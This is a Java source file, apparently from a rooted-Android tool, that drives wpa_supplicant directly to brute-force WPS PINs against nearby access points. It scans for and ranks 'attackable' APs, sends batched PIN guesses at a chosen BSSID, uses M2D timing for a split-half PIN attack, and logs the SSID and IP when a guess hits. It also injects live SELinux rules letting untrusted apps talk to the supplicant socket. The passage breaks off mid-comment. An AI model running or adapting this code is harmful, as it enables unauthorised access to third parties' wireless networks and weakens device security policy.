package io.github.wlmosv_png.wpaforge.wps;

import android.net.LocalSocket;
import android.net.LocalSocketAddress;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;

/**
 * WPS 控制模块 —— 由 root 通过 app_process 启动，直连 supplicant 控制接口。
 *
 * 存在的理由：Android 的 WifiService 会在 supplicant 断开时立刻重连，
 * 把 WPS 状态机挤掉（实测「WPS_PIN 被接受，但几秒内就变回普通重连」）。
 * 本模块配合 {@code cmd wifi start/stop-restricting-auto-join-to-subscription-id}
 * 把框架的自动重连按住，让 WPS 拿到执行权。
 *
 * 约定：所有输出为 KEY=VALUE 行，APP 侧按行解析。
 */
public final class WpsHelper {

    /** supplicant 的 per-interface 控制接口（unix DGRAM）。 */
    static final String SOCK = "/data/vendor/wifi/wpa/sockets/wlan0";

    static final String MAGISKPOLICY = "/data/adb/magisk/magiskpolicy";

    private WpsHelper() {
    }

    public static void main(String[] args) {
        try {
            String action = args.length > 0 ? args[0] : "status";
            switch (action) {
                case "selinux":
                    injectSelinux();
                    break;
                case "selftest":
                    selftest();
                    break;
                case "autojoin":
                    autojoin(args.length > 1 && "on".equalsIgnoreCase(args[1]));
                    break;
                case "status":
                    statusOut();
                    break;
                case "scan":
                    scanWps();
                    break;
                case "wpsinfo":
                    wpsInfo(args.length > 1 ? args[1] : "");
                    break;
                case "probe":
                    probe(args[1], args[2],
                            args.length > 3 ? Integer.parseInt(args[3]) : 12);
                    break;
                case "raw":
                    raw(join(args, 1, args.length));
                    break;
                case "pin":
                    tryOne(args[1], args[2],
                            args.length > 3 ? Integer.parseInt(args[3]) : 20,
                            args.length > 4 ? dec(args[4]) : "");
                    break;
                case "batch":
                    batch(args[1], args[2].split(","),
                            args.length > 3 ? Integer.parseInt(args[3]) : 20,
                            args.length > 4 ? Integer.parseInt(args[4]) : 60,
                            args.length > 5 ? dec(args[5]) : "");
                    break;
                default:
                    raw(join(args, 0, args.length));
                    break;
            }
        } catch (Throwable t) {
            System.out.println("ERROR=" + t);
        }
        System.out.flush();
    }

    // ---------------- SELinux ----------------

    /**
     * supplicant 的回包必须被 SELinux 放行，否则表现为「连上了、命令也发了、
     * 就是收不到回复」，而且不报错。规则幂等，重复注入无副作用。
     */
    /**
     * 注入 SELinux 放行规则，并用真实结果支撑「SELINUX=ok」。
     *
     * <p>修复前这里无条件打印 {@code SELINUX=ok} —— {@code magiskpolicy} 的退出码
     * 从不检查，注入被拒/二进制缺失也被吞掉，于是通道失效时用户只会看到
     * 「一屏 UNKNOWN / LINK_LOST」，看不出是策略问题。
     *
     * <p>现在：逐条规则检查退出码，返回 success / degraded / error 三个档位，
     * 并输出 {@code SELINUX_STATUS=...}（由 App 侧判定通道诊断）。
     */
    static String injectSelinux() {
        String[][] rules = {
                {"allow", "hal_wifi_supplicant_default", "magisk", "unix_dgram_socket", "sendto"},
                {"allow", "untrusted_app", "hal_wifi_supplicant_default", "unix_dgram_socket",
                        "sendto", "recvfrom", "write", "read"},
                {"allow", "hal_wifi_supplicant_default", "untrusted_app", "unix_dgram_socket",
                        "sendto", "write"},
        };
        int ok = 0, fail = 0, err = 0;
        String lastErr = "";
        for (String[] r : rules) {
            try {
                Process p = Runtime.getRuntime()
                        .exec(new String[]{MAGISKPOLICY, "--live", String.join(" ", r)});
                int rc = p.waitFor();
                if (rc == 0) ok++;
                else { fail++; lastErr = "magiskpolicy exit=" + rc; }
            } catch (Throwable t) {
                err++;
                lastErr = String.valueOf(t);
            }
        }
        // 第一条（supplicant→magisk 回包放行）是最关键的；另两条是辅助。
        String status;
        if (ok == rules.length) {
            status = "SELINUX_STATE=ok";
        } else if (ok >= 1) {
            status = "SELINUX_STATE=degraded";   // 关键规则可能已生效，但辅助规则失败
        } else {
            status = "SELINUX_STATE=error";
        }
        System.out.println(status);
        if (!lastErr.isEmpty()) System.out.println("SELINUX_WARN=" + lastErr);
        return status;
    }

    /**
     * 通道自检：真正读一次 supplicant 回包，输出结构化诊断。
     *
     * <p>修复前通道失效表现为「一屏 UNKNOWN / LINK_LOST」，无法区分
     * root / socket / SELinux / supplicant / 命令被拒 / 数据格式。
     * 现在输出 CHANNEL=...（分类来自 {@link io.github.wlmosv_png.wpaforge.wps.WpsChannelDiag}）。
     */
    static void selftest() {
        // root 由 app_process 本身保证能跑；socket 探测
        boolean socketExists = new java.io.File(SOCK).exists();
        System.out.println("SOCK_EXISTS=" + (socketExists ? "1" : "0"));
        Conn c = null;
        boolean reply = false, refused = false, parse = false;
        String state = "";
        try {
            c = new Conn();
            String st = c.cmd("STATUS");
            reply = st != null && !st.trim().isEmpty();
            refused = st != null && st.trim().startsWith("FAIL");
            if (reply && !refused) {
                parse = st.contains("=");
                state = field(st, "wpa_state");
            }
        } catch (Throwable t) {
            System.out.println("CHANNEL_ERR=" + t);
        } finally {
            if (c != null) c.close();
        }
        WpsChannelDiag.ChannelObs o = new WpsChannelDiag.ChannelObs();
        o.rootOk = true;
        o.socketExists = socketExists;
        o.selinuxOk = true;   // selinux 由 SELINUX_STATE 单独反映
        o.replyReceived = reply;
        o.commandRejected = refused;
        o.dataParseable = parse;
        String diag = WpsChannelDiag.judgeChannel(o);
        System.out.println("CHANNEL=" + diag);
        System.out.println("CHANNEL_STATE=" + (state.isEmpty() ? "-" : state));
    }

    // ---------------- 自动重连刹车 ----------------

    /**
     * 放开/按住 framework 自动重连。
     *
     * <p>修复前只打印 {@code AUTOJOIN=on/off}，异常退出时可能遗留「限制重连」状态
     * 而没有任何恢复提示。现在返回真实结果：{@code true}=命令成功；{@code false}=失败
     * （App 侧据此决定是否把「未恢复」记进台账并提示用户）。
     */
    static boolean autojoin(boolean enable) {
        String cmd = enable
                ? "cmd wifi stop-restricting-auto-join-to-subscription-id"
                : "cmd wifi start-restricting-auto-join-to-subscription-id 0";
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
            int code = p.waitFor();
            boolean okcmd = code == 0;
            System.out.println("AUTOJOIN=" + (enable ? "on" : "off"));
            System.out.println("EXIT=" + code);
            return okcmd;
        } catch (Throwable t) {
            System.out.println("AUTOJOIN=error");
            System.out.println("ERROR=" + t);
            return false;
        }
    }

    // ---------------- 状态（结构化输出，供 App 直接展示） ----------------

    static void statusOut() {
        Conn c = null;
        try {
            c = new Conn();
            String st = c.cmd("STATUS");
            System.out.println("SSID=" + field(st, "ssid"));
            System.out.println("BSSID=" + field(st, "bssid"));
            System.out.println("NETID=" + field(st, "id"));
            System.out.println("STATE=" + field(st, "wpa_state"));
            System.out.println("KEYMGMT=" + field(st, "key_mgmt"));
            System.out.println("IP=" + field(st, "ip_address"));
            System.out.println("FREQ=" + field(st, "freq"));
            System.out.println("STATUS_OK=" + (st.isEmpty() ? "0" : "1"));
        } catch (Throwable t) {
            System.out.println("STATUS_OK=0");
            System.out.println("ERROR=" + t);
        } finally {
            if (c != null) c.close();
        }
    }

    // ---------------- WPS 目标发现 ----------------

    /**
     * 扫描周边并只输出支持 WPS 的 AP。
     * App 侧靠这个列表让用户点选目标，避免「不知道 BSSID 填什么」。
     *
     * 输出：
     *   AP=<bssid>|<ssid>|<rssi>|<freq>
     *   SCAN_OK=1
     */
    /** 扫描轮数：弱信号目标时有时无，单轮会漏掉真正可打的那台。 */
    static final int SCAN_ROUNDS = 3;

    /**
     * 扫描周边支持 WPS 的 AP，并附带能力画像。
     *
     * 改进点：多轮扫描合并去重。
     * 实测教训：同一个 SSID 下存在多个 BSSID 时，弱信号那个（真正可打的）经常
     * 一轮扫不到 —— 直接导致体检名单里出现的是同名的另一个不可打接口。
     * 先把 N 轮的扫描结果合并，再统一查一次 BSS，比每轮都查快得多。
     */
    static void scanWps() {
        Conn c = null;
        try {
            java.util.LinkedHashMap<String, String[]> found = new java.util.LinkedHashMap<>();
            for (int round = 0; round < SCAN_ROUNDS; round++) {
                System.out.println("PHASE=scan" + (round + 1) + "_" + SCAN_ROUNDS);
                System.out.flush();
                execLocal("cmd wifi start-scan", 6000);
                sleep(4500);
                String out = exec("cmd wifi list-scan-results", 8000);
                for (String line : out.split("\n")) {
                    String[] p = line.trim().split("\\s+");
                    if (p.length < 6) continue;
                    if (!p[0].matches("(?i)[0-9a-f]{2}(:[0-9a-f]{2}){5}")) continue;
                    int flagIdx = -1;
                    for (int i = 4; i < p.length; i++) {
                        if (p[i].startsWith("[")) {
                            flagIdx = i;
                            break;
                        }
                    }
                    if (flagIdx < 0) continue;
                    StringBuilder flags = new StringBuilder();
                    for (int i = flagIdx; i < p.length; i++) flags.append(p[i]);
                    if (flags.indexOf("[WPS]") < 0) continue;

                    String ssid = join(p, 4, flagIdx);
                    if (ssid.isEmpty()) ssid = "<hidden>";
                    String rssi = p[2].split("\\(")[0];
                    String freq = p[1];
                    // 同一 BSSID 多轮出现时保留信号最好的一次
                    String[] prev = found.get(p[0]);
                    if (prev == null || parseInt(rssi, -999) > parseInt(prev[2], -999)) {
                        found.put(p[0], new String[]{p[0], ssid, rssi, freq});
                    }
                }
            }

            try {
                c = new Conn();
            } catch (Throwable ignored) {
                c = null;
            }

            /*
             * 通道自检：部分系统（实测 ColorOS 15 / Android 15）的 SELinux 策略不允许
             * supplicant 往 root(magisk) 域回包 —— avc denied { sendto },
             * scontext=u:r:hal_wifi_supplicant_default:s0 tcontext=u:r:magisk:s0。
             * 症状是「命令发得出去、回包收不回来」，上层只会看到一屏 UNKNOWN，
             * 用户无从判断是「这些 AP 真没能力」还是「压根没读到」。
             * 所以这里直接测一次 STATUS，把结论打给界面。
             */
            if (c != null) {
                String chk = c.cmd("STATUS");
                System.out.println("CTRL_OK=" + (chk != null && !chk.trim().isEmpty() ? "1" : "0"));
            } else {
                System.out.println("CTRL_OK=0");
            }
            System.out.flush();

            /*
             * 补第二数据源：supplicant 自己的 BSS 表。
             *
             * 为什么必须补：framework 的 list-scan-results 和 supplicant 的 BSS 表
             * 会给出**不一样的 BSSID**。实测 CMCC-6339 就是典型：
             *   list-scan-results → c8:98:28:11:22:12（无响应，打不动）
             *   BSS 表            → c8:98:28:11:22:11（关联 5.8 秒，真能打）
             * 只信前者的后果就是「体检名单里全是打不动的，能打的扫不出来」。
             * 枚举方式：BSS FIRST 拿首条，再 BSS NEXT-<id> 顺序遍历（id 是内部索引，不连续）。
             */
            System.out.println("PHASE=enum");
            System.out.flush();
            if (c != null) {
                String blk = c.cmd("BSS FIRST");
                String id = bssIdOf(blk);
                int guard = 0;
                while (id != null && guard++ < 300) {
                    String bssid = bssField(blk, "bssid");
                    if (!bssid.isEmpty() && !found.containsKey(bssid)) {
                        // 只收带 WPS IE（OUI 00:50:F2 type 04）的。
                        // BSS 表里绝大多数是没开 WPS 的设备，不过滤的话日志会被
                        // 上百条 UNKNOWN 淹没（实测 125 条里 90 条是这种噪音）。
                        String ie = bssField(blk, "ie");
                        if (ie != null && ie.toLowerCase().contains("0050f204")) {
                            String ssid = bssField(blk, "ssid");
                            String lvl = bssField(blk, "level");
                            String freq = bssField(blk, "freq");
                            found.put(bssid, new String[]{bssid,
                                    ssid.isEmpty() ? "<hidden>" : ssid,
                                    lvl.isEmpty() ? "0" : lvl,
                                    freq.isEmpty() ? "0" : freq});
                        }
                    }
                    String nxt = c.cmd("BSS NEXT-" + id);
                    String nid = bssIdOf(nxt);
                    if (nid == null || nid.equals(id)) break;
                    blk = nxt;
                    id = nid;
                }
                System.out.println("BSS_ENUM=" + guard);
            }

            System.out.println("PHASE=caps");
            System.out.println("CAP_TOTAL=" + found.size());
            System.out.flush();
            int n = 0;
            int skippedNoWps = 0;
            for (String[] ap : found.values()) {
                String verdict = "UNKNOWN";
                String methods = "";
                String dev = "";
                String sel = "-1";
                String dpid = "-1";
                boolean haveBss = false;
                if (c != null) {
                    String bsOut = c.cmd("BSS " + ap[0]);
                    haveBss = bsOut != null && !bsOut.trim().isEmpty()
                            && !bsOut.startsWith("FAIL") && !bsOut.startsWith("UNKNOWN");
                    String[] cap = parseBssCap(bsOut);
                    if (cap != null) {
                        verdict = cap[0];
                        methods = cap[1];
                        dev = cap[2];
                        if (cap.length > 4) sel = cap[4];
                        if (cap.length > 5) dpid = cap[5];
                    }
                }
                // 兜底：BSS 查得到却没有 WPS 段 → 这个 AP 没开 WPS，不属于目标
                if (haveBss && "UNKNOWN".equals(verdict)) {
                    skippedNoWps++;
                    continue;
                }
                System.out.println("AP=" + ap[0] + "|" + ap[1] + "|" + ap[2] + "|" + ap[3]
                        + "|" + verdict + "|" + methods + "|" + dev + "|" + sel + "|" + dpid);
                n++;
                System.out.println("PROGRESS=" + n + "_" + (found.size() - skippedNoWps));
                System.out.flush();
            }
            System.out.println("SKIP_NO_WPS=" + skippedNoWps);
            System.out.println("SCAN_ROUNDS=" + SCAN_ROUNDS);
            System.out.println("AP_COUNT=" + n);
            System.out.println("SCAN_OK=1");
        } catch (Throwable t) {
            System.out.println("SCAN_OK=0");
            System.out.println("ERROR=" + t);
        } finally {
            if (c != null) c.close();
        }
    }

    // ---------------- WPS 能力画像 ----------------
    //
    // 判定「这个 AP 能不能跑 PIN」不看关联时长，看它自己宣告的
    // WSC Configuration Methods。位定义来自 WSC 规范（wpa_supplicant 的 wps_defs.h）：
    //
    //   0x0001 USBA
    //   0x0002 ETHERNET
    //   0x0004 LABEL              AP 上印着静态 PIN（贴纸）
    //   0x0008 DISPLAY            AP 能显示 PIN
    //   0x0080 PUSHBUTTON         按键配对
    //   0x0100 KEYPAD             AP 带键盘，接受外部送 PIN
    //   0x0200 VIRTUAL_PUSHBUTTON
    //   0x0280 PHYSICAL_PUSHBUTTON（= 0x0200 | 0x0080）
    //   0x0480 VIRTUAL_DISPLAY_PIN
    //   0x2008 PHYSICAL_DISPLAY_PIN（= 0x2000 | 0x0008）
    //
    // 只有 KEYPAD 或 LABEL 意味着 AP 会接受第三方 registrar 送来的 PIN
    // —— 与 wpa_supplicant 的 pin_capable 判据一致。
    // 实测本机周边：BroadcomAP 报 0x2008（自带屏幕显示型）→ PIN 攻击打不动；
    // fiberhome ONT 报 0x0100 → 可打。以前两者在列表里长得一模一样。
    //
    // 2026-11-08 修正（第二阶段审计 P1-3）：CM_LABEL 原来写成 0x0001 ——
    // 那是 USBA 的位。后果：config_methods=0x0004（只有贴纸 PIN）的 AP
    // 被判成 NO_PIN，界面写「不收外部 PIN」，体检还会直接跳过它 ——
    // 用户以为打不动。组合逻辑（KEYPAD|LABEL）本来是对的，错的是常量值。

    static final int CM_LABEL = 0x0004;
    static final int CM_PUSHBUTTON = 0x0080;
    static final int CM_KEYPAD = 0x0100;

    /** 位掩码里是否含「接受外部 PIN」的两位之一（唯一判据出处）。 */
    static boolean pinCapable(int mask) {
        return (mask & CM_KEYPAD) != 0 || (mask & CM_LABEL) != 0;
    }

    /**
     * BSS 输出里某个 key 的值。
     * 注意：supplicant 的 BSS 回复是**每行一个 key=value**。
     * 之所以看起来像 "a | b | c"，是 raw 动作打印时把换行换成了 " | " ——
     * 按竖线切会一个字段都取不到（我为此白跑了一轮真机验证）。
     * 两种形态都吃下，免得以后再见一次同样的坑。
     */
    /** 取 BSS 输出里的内部 id（枚举用）。id 是 supplicant 的索引，不连续。 */
    static String bssIdOf(String blk) {
        if (blk == null) return null;
        for (String seg : blk.split("[\\n\\r|]")) {
            seg = seg.trim();
            if (seg.startsWith("id=")) {
                String v = seg.substring(3).trim();
                return v.isEmpty() ? null : v;
            }
        }
        return null;
    }

    static String bssField(String blk, String key) {
        for (String seg : blk.split("[\\n\\r|]")) {
            seg = seg.trim();
            int i = seg.indexOf('=');
            if (i > 0 && seg.substring(0, i).trim().equals(key)) {
                return seg.substring(i + 1).trim();
            }
        }
        return "";
    }

    /**
     * 从 WSC IE 里读 AP Setup Locked（属性 0x1057）。
     * 解析路径：按 IE 遍历 → 找 ID 0xdd / OUI 00:50:F2 / type 0x04 → 扫属性表。
     * 锁定的 AP 无论跑多少 PIN 都不会成功，必须让用户先知道。
     */
    /**
     * 从 WSC IE 里取某个属性的值（hex 字符串）。找不到返回 null。
     *
     * 常用属性号：
     *   0x1044 Wi-Fi Protected Setup State   1=未配置 2=已配置
     *   0x1041 Selected Registrar            **1 = AP 正处于配对待机**
     *   0x1012 Device Password ID            4=PushButton 0=Default 1=User-specified
     *   0x1057 AP Setup Locked               1 = 已锁定
     *   0x1008 Config Methods                位掩码，见 parseBssCap
     */
    static String wscAttr(String ie, int want) {
        if (ie == null || ie.isEmpty()) return null;
        String h = ie.toLowerCase().replace(" ", "");
        int p = 0;
        while (p + 4 <= h.length()) {
            int id = hex(h, p, 2);          // IE 头：id(1B) + len(1B) = 4 个 hex 字符
            int len = hex(h, p + 2, 2);
            if (id < 0 || len < 0) return null;
            int dataStart = p + 4;
            int dataEnd = dataStart + len * 2;
            if (dataEnd > h.length()) return null;
            if (id == 0xdd && len >= 4 && h.startsWith("0050f204", dataStart)) {
                int q = dataStart + 8;      // 跳过 OUI(3B) + type(1B)
                while (q + 8 <= dataEnd) {
                    int type = hex(h, q, 4);    // WSC 属性：type(2B) + len(2B)
                    int alen = hex(h, q + 4, 4);
                    if (type < 0 || alen < 0) break;
                    q += 8;
                    if (q + alen * 2 > dataEnd) break;
                    if (type == want) return h.substring(q, q + alen * 2);
                    q += alen * 2;
                }
            }
            p = dataEnd;
        }
        return null;
    }

    /** AP Setup Locked（0x1057）—— 锁定的 AP 无论试多少 PIN 都不会成功。 */
    static boolean apSetupLocked(String ie) {
        String v = wscAttr(ie, 0x1057);
        return v != null && v.length() >= 2 && hex(v, 0, 2) != 0;
    }

    /**
     * Selected Registrar（0x1041）：AP 是否正处于 WPS 配对待机。
     * 返回 1 / 0，属性不存在返回 -1。
     *
     * 这条属性只在 AP 真的在等配对时才会出现在 beacon 里。
     * 实测本机周边 4 个 AP **全都没有**，也就是说它们都不在配对窗口 ——
     * 这解释了为什么发 PIN 出去只关联 250ms 就被踢。
     */
    static int selectedRegistrar(String ie) {
        String v = wscAttr(ie, 0x1041);
        return v == null || v.length() < 2 ? -1 : hex(v, 0, 2);
    }

    /** Device Password ID（0x1012）：4=PushButton，0=Default，1=User-specified；无则 -1。 */
    static int devicePasswordId(String ie) {
        String v = wscAttr(ie, 0x1012);
        return v == null || v.length() < 4 ? -1 : hex(v, 0, 4);
    }

    static int hex(String s, int off, int n) {
        try {
            return (int) Long.parseLong(s.substring(off, off + n), 16);
        } catch (Throwable t) {
            return -1;
        }
    }

    /**
     * 解析 BSS 输出 → {verdict, methods, device, ssid}；无 WPS 信息返回 null。
     * verdict: PIN_OK（接受外部 PIN）/ NO_PIN（只显示或只按键）/ LOCKED / 未知则 null
     */
    static String[] parseBssCap(String blk) {
        if (blk == null) return null;
        blk = blk.trim();
        if (blk.isEmpty() || blk.startsWith("FAIL") || blk.startsWith("UNKNOWN")) return null;
        String mstr = bssField(blk, "wps_config_methods");
        if (mstr.isEmpty()) return null;
        int mask;
        try {
            mask = (mstr.startsWith("0x") || mstr.startsWith("0X"))
                    ? Integer.parseInt(mstr.substring(2), 16)
                    : Integer.parseInt(mstr);
        } catch (Throwable t) {
            return null;
        }
        String verdict;
        if (apSetupLocked(bssField(blk, "ie"))) {
            verdict = "LOCKED";
        } else if (pinCapable(mask)) {
            verdict = "PIN_OK";
        } else {
            verdict = "NO_PIN";
        }
        String ie = bssField(blk, "ie");
        int sel = selectedRegistrar(ie);
        int dpid = devicePasswordId(ie);
        return new String[]{verdict, mstr, bssField(blk, "wps_device_name"),
                bssField(blk, "ssid"), String.valueOf(sel), String.valueOf(dpid)};
    }

    /** 单个 BSSID 的能力画像（App 侧补查用）。 */
    static void wpsInfo(String bssid) {
        Conn c = null;
        try {
            c = new Conn();
            String blk = c.cmd("BSS " + bssid);
            String[] cap = parseBssCap(blk);
            if (cap == null) {
                // BSS 表里没有它（扫描后没回填），或该 BSS 无 WPS IE
                System.out.println("WPS_BSSID=" + bssid);
                System.out.println("WPS_VERDICT=NO_WPS");
                System.out.println("WPS_OK=0");
                return;
            }
            int mask = 0;
            try {
                mask = cap[1].startsWith("0x") || cap[1].startsWith("0X")
                        ? Integer.parseInt(cap[1].substring(2), 16) : Integer.parseInt(cap[1]);
            } catch (Throwable ignored) {
            }
            System.out.println("WPS_BSSID=" + bssid);
            System.out.println("WPS_SSID=" + cap[3]);
            System.out.println("WPS_DEV=" + cap[2]);
            System.out.println("WPS_STATE=" + bssField(blk, "wps_state"));
            System.out.println("WPS_METHODS=" + cap[1]);
            System.out.println("WPS_PIN_CAPABLE=" + (pinCapable(mask) ? "1" : "0"));
            System.out.println("WPS_PBC_CAPABLE=" + (((mask & CM_PUSHBUTTON) != 0) ? "1" : "0"));
            String ie = bssField(blk, "ie");
            String[] cap2 = parseBssCap(blk);
            System.out.println("WPS_LOCKED=" + (apSetupLocked(ie) ? "1" : "0"));
            System.out.println("WPS_SEL_REG=" + (cap2 != null && cap2.length > 4 ? cap2[4] : "-1"));
            System.out.println("WPS_DEV_PWD_ID=" + (cap2 != null && cap2.length > 5 ? cap2[5] : "-1"));
            System.out.println("WPS_VERDICT=" + cap[0]);
            System.out.println("WPS_OK=1");
        } catch (Throwable t) {
            System.out.println("WPS_BSSID=" + bssid);
            System.out.println("WPS_VERDICT=NO_WPS");
            System.out.println("WPS_OK=0");
            System.out.println("ERROR=" + t);
        } finally {
            if (c != null) c.close();
        }
    }

    // ---------------- 诊断探针 ----------------

    /**
     * 挂上 supplicant 事件流的同时发一次 WPS_PIN，把「事件 + 状态变化」
     * 按毫秒时间戳打出来。
     *
     * 存在的理由：轮询状态只能看到「关联了几毫秒」，看不到 AP 用什么理由
     * 拒的（ASSOC-REJECT 的 status_code、WPS-FAIL 的原因）。而一次尝试
     * 每次都要等满 20 秒窗口，正是因为不看事件 —— 其实一秒内就已经失败了。
     */
    static void probe(String bssid, String pin, int sec) {
        Conn ev = null, cl = null;
        try {
            ev = new Conn();
            ev.cmd("ATTACH");           // 该连接此后只收事件
            cl = new Conn();            // 另一个连接发命令

            long t0 = System.currentTimeMillis();
            System.out.println("PROBE_START bssid=" + bssid + " pin=" + pin + " sec=" + sec);
            System.out.println("[0ms] BEFORE=" + field(cl.cmd("STATUS"), "wpa_state"));
            String r = cl.cmd("WPS_PIN " + bssid + " " + pin);
            System.out.println("[" + (System.currentTimeMillis() - t0) + "ms] WPS_PIN_REPLY=" + oneLine(r));

            long lastStat = 0;
            while (System.currentTimeMillis() - t0 < sec * 1000L) {
                String e = ev.read();
                if (e != null && !e.isEmpty()) {
                    for (String ln : e.split("\n")) {
                        ln = ln.trim();
                        if (!ln.isEmpty()) {
                            System.out.println("[" + (System.currentTimeMillis() - t0) + "ms] EVT " + ln);
                        }
                    }
                }
                if (System.currentTimeMillis() - lastStat >= 500) {
                    lastStat = System.currentTimeMillis();
                    String st = cl.cmd("STATUS");
                    System.out.println("[" + (System.currentTimeMillis() - t0) + "ms] STATE="
                            + field(st, "wpa_state")
                            + " id=" + field(st, "id")
                            + " ssid=" + field(st, "ssid")
                            + " km=" + field(st, "key_mgmt"));
                }
            }
            System.out.println("PROBE_END");
        } catch (Throwable t) {
            System.out.println("ERROR=" + t);
        } finally {
            if (ev != null) ev.close();
            if (cl != null) cl.close();
        }
    }

    // ---------------- 命令 ----------------

    static void raw(String cmd) {
        Conn c = null;
        try {
            c = new Conn();
            System.out.println("CMD=" + cmd);
            System.out.println("REPLY=" + oneLine(c.cmd(cmd)));
        } catch (Throwable t) {
            System.out.println("ERROR=" + t);
        } finally {
            if (c != null) c.close();
        }
    }

    /** 单次 WPS PIN 尝试（targetSsid 用于归属判定，可空）。 */
    static void tryOne(String bssid, String pin, int timeoutSec, String targetSsid) {
        Conn c = null;
        try {
            c = new Conn();
            Stats st = runOne(c, bssid, pin, timeoutSec, targetSsid);
            System.out.println("PIN=" + pin);
            System.out.println("RESULT=" + st.result);
            System.out.println("ELAPSED_MS=" + st.elapsedMs);
            System.out.println("ASSOC_COUNT=" + st.assocCount);
            System.out.println("MAX_ASSOC_MS=" + st.maxAssocMs);
            System.out.println("WPS_SESSION=" + (st.sawWpsSession ? "1" : "0"));
            System.out.println("LOG_KIND=" + st.logKind);
            System.out.println("M2D_TO_END_MS=" + st.m2dToEndMs);
            System.out.println("AP_LOCKED=" + st.apLocked);
            // 命中证据：全部回传 App（修复前这三个字段只在单条路径打印，App 也不解析，
            // 等于「采集了但不进证据体系」）。值一律 URL 编码，避免 SSID 带空格。
            System.out.println("HIT_VERDICT=" + enc(st.hitVerdict));
            System.out.println("HIT_WHY=" + enc(st.hitWhy));
            System.out.println("HIT_FACTS=" + enc(st.hitFacts));
            System.out.println("HIT_SSID=" + enc(st.hitSsid));
            System.out.println("HIT_BSSID=" + enc(st.hitBssid));
            System.out.println("HIT_IP=" + enc(st.hitIp));
            System.out.println("HIT_CONFIRM=" + st.hitConfirm);
            System.out.println("HIT_NETID=" + st.hitNetId);
            System.out.println("HIT_BASE_NETID=" + st.baseNetId);
            System.out.println("HIT_TARGET_SSID=" + enc(st.targetSsid));
            System.out.println("LOG_TEXT=" + st.logText);
        } catch (Throwable t) {
            System.out.println("RESULT=ERROR");
            System.out.println("ERROR=" + t);
        } finally {
            if (c != null) c.close();
        }
    }

    /**
     * 批量尝试，减少 app_process 启动开销。
     * 命中即停，剩余 PIN 由 App 侧下次续跑。
     */
    static void batch(String bssid, String[] pins, int perTrySec, int totalSecBudget) {
        batch(bssid, pins, perTrySec, totalSecBudget, "");
    }

    /**
     * 批量尝试，减少 app_process 启动开销。
     *
     * <p>命中（协议确认）即停，剩余 PIN 由 App 侧下次续跑。
     * 「疑似命中」（SUCCESS_UNVERIFIED）**不停** —— 那只是证据不足，
     * 停下来会让真正的命中被永久跳过；它只作为证据被记下来。
     *
     * <p>每条 PIN 之后紧跟一行 {@code HIT …} 证据行（值 URL 编码）。
     * 校验位不合法的候选也会输出 {@code RESULT=SKIPPED_INVALID}：
     * App 侧据此把「处理过的条数」和「请求的条数」对齐，
     * 不能再出现「请求 5 条、实际跑 3 条，游标却推 5」。
     */
    static void batch(String bssid, String[] pins, int perTrySec, int totalSecBudget,
                      String targetSsid) {
        Conn c = null;
        long budgetStart = System.currentTimeMillis();
        int hit = 0;
        try {
            c = new Conn();
            System.out.println("BATCH_START=" + pins.length);
            for (String pin : pins) {
                pin = pin.trim();
                if (pin.isEmpty()) continue;
                // 校验位不合法的 PIN 一定会被 AP 直接拒，别浪费一次尝试额度；
                // 但必须如实上报「这条被处理过了」，否则 App 侧的记账会错位。
                if (!WpsPins.valid(pin)) {
                    System.out.println("PIN=" + pin + " RESULT=SKIPPED_INVALID");
                    continue;
                }
                if (System.currentTimeMillis() - budgetStart > totalSecBudget * 1000L) {
                    System.out.println("BUDGET=exhausted");
                    break;
                }
                Stats st = runOne(c, bssid, pin, perTrySec, targetSsid);
                System.out.println("PIN=" + pin + " RESULT=" + st.result
                        + " ELAPSED_MS=" + st.elapsedMs
                        + " ASSOC_COUNT=" + st.assocCount
                        + " MAX_ASSOC_MS=" + st.maxAssocMs
                        + " WPS_SESSION=" + (st.sawWpsSession ? "1" : "0")
                        + " LOG_KIND=" + st.logKind
                        + " M2D_MS=" + st.m2dToEndMs
                        + " LOCKED=" + st.apLocked);
                if (!st.hitVerdict.isEmpty()) System.out.println(evidenceLine(st, pin));
                if ("SUCCESS".equals(st.result)) {
                    hit = 1;
                    break;
                }
            }
            System.out.println("BATCH_END HIT=" + hit);
        } catch (Throwable t) {
            System.out.println("BATCH_END HIT=" + hit + " ERROR=" + t);
        } finally {
            if (c != null) c.close();
        }
    }

    // ---------------- 单次尝试的核心 ----------------

    static final class Stats {
        String result = "TIMEOUT";
        long elapsedMs;
        int assocCount;
        long maxAssocMs;
        /** 是否建立过 km=WPS 的关联 —— 「AP 真的在跟我们配对」的铁证 */
        boolean sawWpsSession;
        /** 是否进过 ASSOCIATING/ASSOCIATED 阶段 */
        boolean sawAssocPhase;
        /** 状态变化次数，用于诊断 */
        int stages;
        /** 本轮 supplicant 日志指纹：NONE / EAP_ONLY / M2D_ONLY / M2D_THEN_MORE ... */
        String logKind = "NONE";
        /** 本轮 WPS 相关日志正文（已压平） */
        String logText = "";
        /**
         * 从看到 WPS-M2D 到本轮结束的毫秒数（-1 = 没看到 M2D）。
         * 拆半攻击的时序判据：错 PIN 时这个值稳定在 EAP 重传超时附近（~9500ms）；
         * 一旦前 4 位被接受，AP 会继续回消息，这个值就会明显偏离基线。
         */
        long m2dToEndMs = -1;
        /** 本轮结束时 AP 是否处于 WPS 锁定（beacon 0x1057）：1=已锁 0=未锁 -1=没查到 */
        int apLocked = -1;
        /** 命中时 supplicant 报的 SSID / IP（供人工核对，也是「真拿到配置」的证据） */
        String hitSsid = "";
        String hitIp = "";
        /** 命中后二次确认：600ms 后再查一次状态仍为 COMPLETED */
        int hitConfirm = -1;

        // ---- 归属与证据（第二阶段新增） ----
        /** 目标 BSSID / SSID（归属判定的参照物）。 */
        String targetBssid = "";
        String targetSsid = "";
        /** 命中帧里当前连着的 AP 与 netId。 */
        String hitBssid = "";
        int hitNetId = -1;
        /** 发命令前的基线 netId。 */
        int baseNetId = -1;
        /** 判定所用的那一帧（复核帧优先）的状态，供证据复算。 */
        String hitState = "";
        String hitKeyMgmt = "";
        /** 本次是否与**目标**做过 km=WPS 的关联 / 是否只在别的 BSSID 上见过。 */
        boolean sawTargetWpsSession;
        boolean sawWpsSessionElsewhere;
        /** 结论与理由（{@link WpsHitJudge}）。 */
        String hitVerdict = "";
        String hitWhy = "";
        String hitFacts = "";
    }

    // ---------------- 命中证据 ----------------

    /**
     * 600ms 复核帧 → 证据里的 confirm 值。
     *
     * <ul>
     *   <li>{@code 1} 仍 COMPLETED 且非 WPS：命中成立；</li>
